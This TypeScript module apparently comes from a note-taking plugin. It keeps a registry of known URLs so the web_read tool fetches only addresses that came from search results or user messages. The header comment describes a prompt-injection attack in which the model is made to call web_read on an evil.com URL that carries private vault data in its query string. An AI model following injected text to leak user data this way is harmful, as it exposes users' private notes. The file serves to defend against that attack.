/**
 * Known-URL provenance registry (E1.3 P6 / L13-11).
 *
 * `web_read` fetches whatever URL the model hands it. A prompt-injection can abuse
 * that to exfiltrate private notes: it makes the model call
 * `web_read('https://evil.com/?q=<data-from-vault>')` — the vault data leaks inside
 * the URL itself. Defence: a URL may only be read when its origin is KNOWN, i.e. it
 * was either returned by a `web_search` in this runtime, or it appeared in a user
 * message. Anything else is refused by the tool (fail-closed).
 *
 * Matching is on the FULL normalized URL (scheme + host lowercased, path/query/hash
 * kept exact) — deliberately NOT host-only, so knowing `evil.com/foo` does NOT unlock
 * `evil.com/?q=secret`.
 *
 * Scope note: the registry is a module-level singleton = plugin-runtime lifetime
 * (spans chat sessions). That is broader than a single chat session but keeps the diff
 * small; the security property (a URL must have a legitimate origin) still holds,
 * because the registry only ever contains provider search results and user-typed URLs.
 *
 * Ceiling (risk register 2026-09-02 / S34 z8): a long-lived runtime that keeps
 * searching/reading URLs would otherwise grow this Set unbounded (a slow memory
 * leak). Capped at MAX_KNOWN_URLS; once full, the OLDEST entry is evicted to make
 * room for the newest — `Set` preserves insertion order, so destructuring the Set
 * (`const [oldest] = _knownUrls`) reads its first item, the oldest one (NOT
 * `.values().next().value`, which types as `any` and trips eslint:obsidian's typed
 * no-unsafe-assignment/no-unsafe-argument — see `registerKnownUrl`). Re-registering
 * an ALREADY-known URL does not change its
 * position (JS `Set.add` on an existing value is a no-op, insertion order untouched),
 * so this is a plain FIFO over first-seen order, not an LRU — a URL kept "alive" by
 * being reused often is NOT protected from eviction if enough new URLs arrive after
 * it. That is an intentional simplicity trade-off for a provenance allowlist: the
 * failure mode of evicting a still-useful URL is fail-closed (web_read is refused,
 * not a security hole), never fail-open.
 */

// F2.22 (release 2.2.0/W3): exported (not just module-internal) so `urlRegistry.test.ts` can
// import the real value instead of keeping its own duplicate literal that could silently drift.
export const MAX_KNOWN_URLS = 2000;

const _knownUrls = new Set<string>();

// http/https only. Stops at whitespace and common wrapping/quoting characters.
const URL_RE = /\bhttps?:\/\/[^\s<>()"'`]+/gi;

/**
 * Canonical form used for both registration and lookup, so equivalent URLs match.
 * Returns null for non-strings / empty input.
 *
 * The `typeof` guard stays: callers hand over whatever the model produced, and the
 * declared `string` is the CONTRACT, not a proof.
 */
export function normalizeUrl(raw: string): string | null {
    if (typeof raw !== 'string') return null;
    const trimmed = raw.trim();
    if (!trimmed) return null;
    try {
        const u = new URL(trimmed); // lowercases scheme + host, percent-encodes consistently
        let href = u.href;
        // Treat "https://host" and "https://host/" as the same (root path, no query/hash).
        if (u.pathname === '/' && !u.search && !u.hash) {
            href = href.replace(/\/$/, '');
        }
        return href;
    } catch {
        return trimmed;
    }
}

/**
 * Register a single URL as known (called by web_search for each result).
 * @returns the normalized URL that was stored, or null if invalid
 */
export function registerKnownUrl(url: string): string | null {
    const n = normalizeUrl(url);
    if (n) {
        _knownUrls.add(n); // no-op (position unchanged) if `n` is already known
        if (_knownUrls.size > MAX_KNOWN_URLS) {
            const [oldest] = _knownUrls;
            if (oldest !== undefined) _knownUrls.delete(oldest);
        }
    }
    return n;
}

/**
 * Extract and register every http(s) URL found in a block of text (called for each
 * user message). Trailing punctuation glued to a URL is stripped.
 * @returns count of URLs registered
 */
export function registerUrlsFromText(text: string): number {
    if (typeof text !== 'string' || !text) return 0;
    const matches = text.match(URL_RE);
    if (!matches) return 0;
    let count = 0;
    for (const match of matches) {
        const cleaned = match.replace(/[.,;:!?)\]}>]+$/, '');
        if (registerKnownUrl(cleaned)) count++;
    }
    return count;
}

/** Whether a URL's origin is known (web_search result or user message). */
export function isUrlKnown(url: string): boolean {
    const n = normalizeUrl(url);
    return n !== null && _knownUrls.has(n);
}

/** Test / reset helper — clears the registry. */
export function _clearKnownUrls(): void {
    _knownUrls.clear();
}

/**
 * Test-only accessor (B1, klaster C4b nit): the "registry stays capped" test had no way to
 * prove the ceiling actually held the registry AT MAX_KNOWN_URLS — it could only prove the
 * newest URL survived, which passes just as well with a ceiling that is a no-op. Exposes the
 * size directly, same pattern as `_clearKnownUrls`.
 */
export function _knownUrlCount(): number {
    return _knownUrls.size;
}
